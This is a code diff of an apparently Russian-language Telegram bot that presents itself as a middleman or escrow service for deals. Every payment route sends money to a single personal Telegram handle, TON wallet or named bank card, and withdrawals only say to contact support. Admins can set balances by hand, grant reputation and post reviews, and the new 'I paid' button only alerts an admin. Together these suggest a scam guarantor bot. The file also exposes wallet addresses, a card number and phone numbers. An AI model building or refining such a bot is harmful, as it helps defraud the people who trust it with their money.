-        "enter_stars": "⭐️ Введіть ваш <b>Telegram username</b> для Stars:",
-        "topup_title": "💰 <b>Поповнення балансу</b>\n\nОберіть спосіб:",
-        "withdraw_text": "💸 <b>Виведення коштів</b>\n\nЗверніться до підтримки:\n👤 @hostelman",
-        "security": "🛡 <b>Безпека</b>\n\nАктиви передаються лише через @hostelman.",
-        "lang_choose": "🌐 <b>Оберіть мову:</b>",
-        "lang_set": "✅ Мова встановлена: Українська 🇺🇦",
-        "topup_stars": "⭐️ Надішліть Stars: <b>@hostelman</b>\n\n⏱ <b>5–15 хвилин</b>",
-        "topup_ton": f"💎 TON адреса:\n<code>UQBu7JOWQIU72kp4r2TG45925P5Rg1qz5wzurEWmC5lWZbTL</code>\n\n@hostelman\n\n⏱ <b>5–15 хвилин</b>",
-        "topup_card": f"💳 Картка:\n<code>2200702126310668</code>\nОзон Банк | +79011716762\n\n⏱ <b>5–15 хвилин</b>",
-        "topup_nft": "🎁 Передайте NFT: <b>@hostelman</b>\n\n⏱ <b>5–15 хвилин</b>",
-        "invalid_username": "❌ Введіть коректний @username:",
+        "topup_stars": "⭐️ <b>Top Up with Stars</b>\n\nSend Stars to: <b>@hostelman</b>\n\n⏱ <b>5–15 minutes</b>",
+        "topup_ton": f"💎 <b>Top Up with TON</b>\n\n<code>UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc</code>\n\nAfter sending contact: <b>@hostelman</b>\n\n⏱ <b>5–15 minutes</b>",
+        "topup_card": f"💳 <b>Top Up with Card</b>\n\n<b>VTB Bank | +89041751408 Alexander F.</b>\n\n• Save receipt.\n• Contact support.\n\n⏱ <b>5–15 minutes</b>",
+        "topup_nft": "🎁 <b>Top Up with NFT</b>\n\nTransfer to: <b>@hostelman</b>\n\n⏱ <b>5–15 minutes</b>",
+        "invalid_username": "❌ Enter a valid @username:",
     },
 }
+
+# Для остальных языков копируем ru с заменой ключевых строк
+for lang_code in ["az", "tr", "kz", "ua"]:
+    if lang_code not in LANGS:
+        LANGS[lang_code] = dict(LANGS["ru"])
+    LANGS[lang_code]["btn_paid"] = "💸 Я оплатил" if lang_code in ("kz", "ua") else "💸 Ödədim" if lang_code == "az" else "💸 Ödedim"
+    LANGS[lang_code]["paid_notify_admin"] = LANGS["ru"]["paid_notify_admin"]
+    LANGS[lang_code]["paid_notify_seller"] = LANGS["ru"]["paid_notify_seller"]
+    LANGS[lang_code]["paid_confirm"] = LANGS["ru"]["paid_confirm"]
+    LANGS[lang_code]["topup_ton"] = f"💎 TON:\n<code>UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc</code>\n\n@hostelman\n\n⏱ <b>5–15 мин</b>"
+    LANGS[lang_code]["topup_card"] = f"💳 <b>ВТБ Банк | +89041751408 Александр Ф.</b>\n\n⏱ <b>5–15 мин</b>"
+
 
 def get_user(uid):
     if uid not in user_data:
@@ -648,22 +346,39 @@ def currency_kb(uid):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💎 TON", callback_data="deal_cur_ton"),
          InlineKeyboardButton(text="⭐️ Stars", callback_data="deal_cur_stars")],
-        [InlineKeyboardButton(text="💳 " + ("Карта (RUB)" if lang == "ru" else "Card (RUB)" if lang == "en" else "Kart (RUB)" if lang in ("tr","az") else "Картка (RUB)" if lang == "ua" else "Карта (RUB)"), callback_data="deal_cur_card"),
+        [InlineKeyboardButton(text="💳 " + ("Карта (RUB)" if lang in ("ru","kz","ua") else "Card (RUB)"), callback_data="deal_cur_card"),
          InlineKeyboardButton(text="🎁 NFT", callback_data="deal_cur_nft")],
         [InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")],
+    ])
+
+def deal_created_kb(uid, deal_id):
+    """Клавиатура после создания сделки — с кнопкой 'Я оплатил'"""
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=L(uid,"btn_paid"), callback_data=f"paid_{deal_id}")],
+        [InlineKeyboardButton(text=L(uid,"btn_write_middle"), url="https://t.me/hostelman")],
+        [InlineKeyboardButton(text=L(uid,"btn_menu"), callback_data="menu")],
+    ])
+
+def deal_info_kb(uid, deal_id):
+    """Клавиатура для участника сделки — с кнопкой 'Я оплатил'"""
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=L(uid,"btn_paid"), callback_data=f"paid_{deal_id}")],
+        [InlineKeyboardButton(text=L(uid,"btn_write_middle"), url="https://t.me/hostelman")],
+        [InlineKeyboardButton(text=L(uid,"btn_menu"), callback_data="menu")],
     ])
 
 def req_kb(uid):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💎 TON", callback_data="req_ton"),
-         InlineKeyboardButton(text="💳 " + ("Карта" if get_lang(uid) in ("ru","kz") else "Card" if get_lang(uid) == "en" else "Kart" if get_lang(uid) in ("tr","az") else "Картка"), callback_data="req_card")],
+         InlineKeyboardButton(text="💳 " + ("Карта" if get_lang(uid) in ("ru","kz","ua") else "Card"), callback_data="req_card")],
         [InlineKeyboardButton(text="⭐️ Username Stars", callback_data="req_stars")],
         [InlineKeyboardButton(text=L(uid,"btn_menu"), callback_data="menu")],
     ])
 
 def add_req_kb(uid, req_type):
+    add_text = {"ru": "Добавить", "en": "Add", "az": "Əlavə et", "tr": "Ekle", "kz": "Қосу", "ua": "Додати"}
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="➕ " + ("Добавить" if get_lang(uid) == "ru" else "Add" if get_lang(uid) == "en" else "Əlavə et" if get_lang(uid) == "az" else "Ekle" if get_lang(uid) == "tr" else "Қосу" if get_lang(uid) == "kz" else "Додати"), callback_data=f"req_{req_type}_deal")],
+        [InlineKeyboardButton(text="➕ " + add_text.get(get_lang(uid), "Добавить"), callback_data=f"req_{req_type}_deal")],
         [InlineKeyboardButton(text=L(uid,"btn_menu"), callback_data="menu")],
     ])
 
@@ -671,8 +386,16 @@ def topup_kb(uid):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="⭐️ Stars", callback_data="topup_stars"),
          InlineKeyboardButton(text="💎 TON", callback_data="topup_ton")],
-        [InlineKeyboardButton(text="💳 " + ("Карта" if get_lang(uid) in ("ru","kz","ua") else "Card" if get_lang(uid) == "en" else "Kart"), callback_data="topup_card"),
+        [InlineKeyboardButton(text="💳 " + ("Карта" if get_lang(uid) in ("ru","kz","ua") else "Card"), callback_data="topup_card"),
          InlineKeyboardButton(text="🎁 NFT", callback_data="topup_nft")],
+        [InlineKeyboardButton(text=L(uid,"btn_menu"), callback_data="menu")],
+        [InlineKeyboardButton(text=L(uid,"btn_support"), url="https://t.me/hostelman")],
+    ])
+
+def topup_paid_kb(uid):
+    """Клавиатура пополнения — с кнопкой 'Я оплатил'"""
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=L(uid,"btn_paid"), callback_data="paid_topup")],
         [InlineKeyboardButton(text=L(uid,"btn_menu"), callback_data="menu")],
         [InlineKeyboardButton(text=L(uid,"btn_support"), url="https://t.me/hostelman")],
     ])
@@ -741,10 +464,7 @@ async def cmd_start(message: Message, state: FSMContext):
                           description=deal["description"],
                           amount=deal["amount"],
                           currency=deal["currency"])
-            await message.answer(deal_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=L(uid, "btn_write_middle"), url="https://t.me/hostelman")],
-                [InlineKeyboardButton(text=L(uid, "btn_menu"), callback_data="menu")]
-            ]))
+            await message.answer(deal_text, parse_mode="HTML", reply_markup=deal_info_kb(uid, deal_id))
             try:
                 seller_uid = deal["uid"]
                 await bot.send_message(seller_uid, L(seller_uid, "partner_notified", deal_id=deal_id, buyer=buyer_name), parse_mode="HTML")
@@ -878,7 +598,7 @@ async def deal_cur(callback: CallbackQuery, state: FSMContext):
                   bot_username=me.username)
 
     await safe_delete(callback.message)
-    await callback.message.answer(deal_text, parse_mode="HTML", reply_markup=back_kb(uid))
+    await callback.message.answer(deal_text, parse_mode="HTML", reply_markup=deal_created_kb(uid, deal_id))
 
     uname = f"@{callback.from_user.username}" if callback.from_user.username else f"ID: {uid}"
     for admin_id in ADMIN_IDS:
@@ -891,6 +611,57 @@ async def deal_cur(callback: CallbackQuery, state: FSMContext):
         )
     await state.clear()
     await callback.answer()
+
+# ===================== КНОПКА "Я ОПЛАТИЛ" =====================
+@dp.callback_query(F.data.startswith("paid_"))
+async def cb_paid(callback: CallbackQuery):
+    uid = callback.from_user.id
+    deal_id = callback.data.replace("paid_", "")
+    uname = f"@{callback.from_user.username}" if callback.from_user.username else f"ID: {uid}"
+
+    if deal_id == "topup":
+        # Пополнение баланса
+        for admin_id in ADMIN_IDS:
+            await bot.send_message(
+                admin_id,
+                f"💸 <b>Пользователь сообщил об оплате (пополнение)</b>\n\n👤 {uname} | ID: {uid}",
+                parse_mode="HTML"
+            )
+        await callback.answer("✅ Уведомление отправлено менеджеру!", show_alert=True)
+        await callback.message.answer(L(uid, "paid_confirm"), parse_mode="HTML", reply_markup=back_kb(uid))
+        return
+
+    deal = deals.get(deal_id)
+    if not deal:
+        await callback.answer("❌ Сделка не найдена", show_alert=True)
+        return
+
+    amount = deal.get("amount", "—")
+    currency = deal.get("currency", "—")
+
+    # Уведомляем админа
+    for admin_id in ADMIN_IDS:
+        await bot.send_message(
+            admin_id,
+            L(admin_id, "paid_notify_admin", deal_id=deal_id, user=uname, amount=amount, currency=currency),
+            parse_mode="HTML"
+        )
+
+    # Уведомляем продавца (создателя сделки)
+    seller_uid = deal.get("uid")
+    if seller_uid and seller_uid != uid:
+        try:
+            await bot.send_message(
+                seller_uid,
+                L(seller_uid, "paid_notify_seller", deal_id=deal_id),
+                parse_mode="HTML"
+            )
+        except Exception:
+            pass
+
+    await callback.answer("✅ Уведомление отправлено!", show_alert=True)
+    await callback.message.answer(L(uid, "paid_confirm"), parse_mode="HTML", reply_markup=back_kb(uid))
+
 
 @dp.callback_query(F.data.endswith("_deal") & F.data.startswith("req_"))
 async def req_from_deal(callback: CallbackQuery, state: FSMContext):
@@ -981,28 +752,28 @@ async def cb_topup(callback: CallbackQuery):
 async def cb_topup_stars(callback: CallbackQuery):
     uid = callback.from_user.id
     await safe_delete(callback.message)
-    await callback.message.answer(L(uid, "topup_stars"), parse_mode="HTML", reply_markup=back_kb(uid))
+    await callback.message.answer(L(uid, "topup_stars"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
     await callback.answer()
 
 @dp.callback_query(F.data == "topup_ton")
 async def cb_topup_ton(callback: CallbackQuery):
     uid = callback.from_user.id
     await safe_delete(callback.message)
-    await callback.message.answer(L(uid, "topup_ton"), parse_mode="HTML", reply_markup=back_kb(uid))
+    await callback.message.answer(L(uid, "topup_ton"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
     await callback.answer()
 
 @dp.callback_query(F.data == "topup_card")
 async def cb_topup_card(callback: CallbackQuery):
     uid = callback.from_user.id
     await safe_delete(callback.message)
-    await callback.message.answer(L(uid, "topup_card"), parse_mode="HTML", reply_markup=back_kb(uid))
+    await callback.message.answer(L(uid, "topup_card"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
     await callback.answer()
 
 @dp.callback_query(F.data == "topup_nft")
 async def cb_topup_nft(callback: CallbackQuery):
     uid = callback.from_user.id
     await safe_delete(callback.message)
-    await callback.message.answer(L(uid, "topup_nft"), parse_mode="HTML", reply_markup=back_kb(uid))
+    await callback.message.answer(L(uid, "topup_nft"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
     await callback.answer()
 
 @dp.callback_query(F.data == "withdraw")
@@ -1029,7 +800,7 @@ async def adm_banner(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in ADMIN_IDS: return
     await safe_delete(callback.message)
     await callback.message.answer(
-        "📸 Отправьте <b>фото + подпись (caption)</b> для нового баннера.",
+        "📸 Отправьте <b>фото + подпись</b> для нового баннера.",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
     await state.set_state(SetBanner.waiting)
@@ -1051,10 +822,8 @@ async def adm_stats(callback: CallbackQuery):
     active = len([d for d in deals.values() if d.get("status") == "active"])
     await callback.message.answer(
         f"📊 <b>Статистика</b>\n\n"
-        f"👥 Всего: <b>{total}</b>\n"
-        f"🧾 С реквизитами: <b>{with_req}</b>\n"
-        f"📋 Сделок: <b>{len(deals)}</b>\n"
-        f"🟢 Активных: <b>{active}</b>",
+        f"👥 Всего: <b>{total}</b>\n🧾 С реквизитами: <b>{with_req}</b>\n"
+        f"📋 Сделок: <b>{len(deals)}</b>\n🟢 Активных: <b>{active}</b>",
         parse_mode="HTML")
     await callback.answer()
 
@@ -1066,8 +835,7 @@ async def adm_users(callback: CallbackQuery):
     for uid in ulist[:20]:
         u = user_data[uid]
         if not isinstance(u, dict): continue
-        text += (f"• <code>{uid}</code> | ⭐{u.get('reputation',0)} | "
-                 f"Сд:{u.get('deals_count',0)} | {'✅' if u.get('has_requisites') else '❌'} | {u.get('lang','ru')}\n")
+        text += f"• <code>{uid}</code> | ⭐{u.get('reputation',0)} | Сд:{u.get('deals_count',0)} | {'✅' if u.get('has_requisites') else '❌'} | {u.get('lang','ru')}\n"
     if len(ulist) > 20:
         text += f"\n...ещё {len(ulist)-20}"
     await callback.message.answer(text, parse_mode="HTML")
@@ -1077,7 +845,7 @@ async def adm_users(callback: CallbackQuery):
 async def adm_rep(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in ADMIN_IDS: return
     await callback.message.answer(
-        "⭐️ <b>Выдача репутации</b>\n\nФормат: <code>@username +5</code> или <code>USER_ID -2</code>",
+        "⭐️ <b>Выдача репутации</b>\n\nФормат: <code>@username +5</code>",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
     await state.set_state(AdminAction.reputation)
@@ -1090,15 +858,14 @@ async def process_rep(message: Message, state: FSMContext):
         parts = message.text.strip().split()
         uid = find_uid(parts[0])
         if uid is None:
-            await message.answer("❌ Пользователь не найден.", parse_mode="HTML")
+            await message.answer("❌ Пользователь не найден.")
             await state.clear()
             return
         delta = int(parts[1])
         user = get_user(uid)
         user["reputation"] = user.get("reputation", 0) + delta
-        new_rep = user["reputation"]
-        await message.answer(f"✅ Репутация <code>{uid}</code>: {delta:+}\nИтого: <b>{new_rep} ⭐</b>", parse_mode="HTML")
-        await bot.send_message(uid, f"⭐️ Ваша репутация: <b>{delta:+}</b>\nТекущая: <b>{new_rep} ⭐</b>", parse_mode="HTML")
+        await message.answer(f"✅ Репутация <code>{uid}</code>: {delta:+}\nИтого: <b>{user['reputation']} ⭐</b>", parse_mode="HTML")
+        await bot.send_message(uid, f"⭐️ Ваша репутация изменена: <b>{delta:+}</b>\nТекущая: <b>{user['reputation']} ⭐</b>", parse_mode="HTML")
     except Exception:
         await message.answer("❌ Ошибка. Формат: <code>@username +5</code>", parse_mode="HTML")
     await state.clear()
@@ -1107,7 +874,7 @@ async def process_rep(message: Message, state: FSMContext):
 async def adm_review(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in ADMIN_IDS: return
     await callback.message.answer(
-        "💬 <b>Добавить отзыв</b>\n\nФормат: <code>@username Текст</code> или <code>USER_ID Текст</code>",
+        "💬 <b>Добавить отзыв</b>\n\nФормат: <code>@username Текст</code>",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
     await state.set_state(AdminAction.review)
@@ -1120,23 +887,21 @@ async def process_review(message: Message, state: FSMContext):
         parts = message.text.strip().split(maxsplit=1)
         uid = find_uid(parts[0])
         if uid is None:
-            await message.answer("❌ Пользователь не найден.", parse_mode="HTML")
+            await message.answer("❌ Пользователь не найден.")
             await state.clear()
             return
-        review_text = parts[1]
-        user = get_user(uid)
-        user.setdefault("reviews", []).append(review_text)
-        await message.answer(f"✅ Отзыв добавлен пользователю <code>{uid}</code>", parse_mode="HTML")
-        await bot.send_message(uid, f"💬 <b>Новый отзыв:</b>\n\n{review_text}", parse_mode="HTML")
+        get_user(uid).setdefault("reviews", []).append(parts[1])
+        await message.answer(f"✅ Отзыв добавлен <code>{uid}</code>", parse_mode="HTML")
+        await bot.send_message(uid, f"💬 <b>Новый отзыв:</b>\n\n{parts[1]}", parse_mode="HTML")
     except Exception:
-        await message.answer("❌ Ошибка. Формат: <code>@username Текст</code>", parse_mode="HTML")
+        await message.answer("❌ Ошибка.")
     await state.clear()
 
 @dp.callback_query(F.data == "adm_balance")
 async def adm_bal(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in ADMIN_IDS: return
     await callback.message.answer(
-        "💰 <b>Изменить баланс</b>\n\nФормат: <code>@username СУММА</code>\nПример: <code>@ivan 150.5</code>",
+        "💰 <b>Изменить баланс</b>\n\nФормат: <code>@username 150.5</code>",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
     await state.set_state(AdminAction.balance)
@@ -1149,7 +914,7 @@ async def process_bal(message: Message, state: FSMContext):
         parts = message.text.strip().split()
         uid = find_uid(parts[0])
         if uid is None:
-            await message.answer("❌ Пользователь не найден.", parse_mode="HTML")
+            await message.answer("❌ Пользователь не найден.")
             await state.clear()
             return
         amount = float(parts[1])
@@ -1159,7 +924,7 @@ async def process_bal(message: Message, state: FSMContext):
         await message.answer(f"✅ Баланс <code>{uid}</code>: {old} → <b>{amount}</b>", parse_mode="HTML")
         await bot.send_message(uid, f"💰 Ваш баланс обновлён: <b>{amount}</b>", parse_mode="HTML")
     except Exception:
-        await message.answer("❌ Ошибка. Формат: <code>@username СУММА</code>", parse_mode="HTML")
+        await message.answer("❌ Ошибка.")
     await state.clear()
 
 @dp.callback_query(F.data == "adm_deals")
@@ -1172,7 +937,7 @@ async def adm_deals_cb(callback: CallbackQuery):
     text = f"📋 <b>Сделки ({len(deals)})</b>\n\n"
     for deal_id, d in list(deals.items())[-10:]:
         text += (f"🆔 <code>{deal_id}</code> | 👤 {d['uid']} | 👥 {d.get('partner','—')}\n"
-                 f"💵 {d['amount']} {d['currency']} | {d['description'][:20]}...\n"
+                 f"💵 {d['amount']} {d['currency']} | {d['description'][:20]}\n"
                  f"🔘 {d['status']}\n\n")
     await callback.message.answer(text, parse_mode="HTML")
     await callback.answer()
